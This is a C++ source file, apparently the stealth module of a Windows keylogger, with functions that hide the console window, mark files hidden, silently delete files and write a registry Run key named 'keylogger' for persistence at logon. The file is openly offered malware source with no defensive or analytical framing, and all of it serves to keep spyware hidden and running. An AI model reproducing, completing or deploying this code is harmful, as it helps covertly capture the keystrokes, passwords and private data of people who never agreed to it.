#include "../include/stealth.h"
#include <fstream>
#include "../include/IO.h"

// Global variable definition
HHOOK eHook = NULL;
std::string keylogger = "";


#include "../include/Stealth.h"
#include <shellapi.h>

bool move_to_recycle_bin(const std::string& filePath) {
    SHFILEOPSTRUCTA fileOp = {0};
    char path[MAX_PATH + 1] = {0};
    strncpy_s(path, filePath.c_str(), MAX_PATH);
    path[filePath.length() + 1] = '\0'; // Double null-terminate

    fileOp.wFunc = FO_DELETE;
    fileOp.pFrom = path;
    fileOp.fFlags = FOF_ALLOWUNDO | FOF_SILENT | FOF_NOERRORUI;

    return (SHFileOperationA(&fileOp) == 0);
}


void hide_console() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE);
}

void hide(std::string file) {
    DWORD attr = GetFileAttributesA(file.c_str());
    if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_HIDDEN)) {
        SetFileAttributesA(file.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }
}


void persistence() {
    HKEY nKey = NULL;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, (KEY_CREATE_SUB_KEY | KEY_SET_VALUE), NULL, &nKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(nKey, "keylogger", 0, REG_SZ, (LPBYTE)keylogger.c_str(), keylogger.length() + 1);
        RegCloseKey(nKey);
    }
}
